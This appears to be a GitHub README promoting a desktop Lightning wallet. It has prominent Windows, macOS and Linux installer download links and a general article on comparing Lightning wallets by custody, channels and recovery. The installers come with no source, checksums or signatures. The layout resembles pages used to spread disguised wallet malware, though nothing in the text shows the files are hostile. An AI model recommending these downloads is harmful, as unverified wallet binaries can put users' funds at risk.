<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Which wallets support Lightning, compared by what they actually do
Support is a feature list. Custody, channels and recovery are the parts that decide.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

A wallet "supports Lightning" in several different senses, and the differences matter more than the
word. This page is a way of comparing them rather than a ranking, because the right pick depends on what
you are protecting against.

## The four questions to ask

**Who holds the keys?** If the answer is a company, a login recovers access and a company failure loses
it. If it is you, a phrase recovers access and no one can freeze it.

**Is there a channel view?** A wallet with no channel concept is holding your balance for you, however
the interface describes it.

**What does the backup restore?** On-chain only, or channels too? A phrase that restores half a wallet is
a trap unless you know.

**Does it run on your platform?** Desktop, mobile and browser wallets differ, and the same brand may
support one and not another.

## The trade, stated plainly

Custodial Lightning wallets are convenient and recoverable by password, and they concentrate risk in
one operator. Non-custodial ones remove that risk and move the responsibility to your backup discipline.

Neither is universally safer. Self-custody without a tested restore is worse than custody, because it
turns a support ticket into a loss.

## Where this wallet fits

Desktop, non-custodial, channels managed for you, phrase-based recovery with a channel backup. That
makes it a spending wallet rather than a savings vault, and
[what you actually hold in a Lightning wallet](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-you-hold-in-a-lightning-wallet.md)
explains what that means for the balance.

## Reading a comparison table

Most comparisons rank by features: number of coins, card support, integrations. Those are easy to list
and rarely decide anything. Custody and recovery decide what happens on the worst day, and they are the
columns worth checking first.

## Questions people ask

### Which wallet is most secure?

The one whose custody model matches your threat and whose restore you have tested.

### Do more features mean less safety?

Not automatically. But every added service is another party in the path.

### Can I change wallets later?

On-chain funds, yes, with the phrase. Channel balances are tied to the wallet that created them.
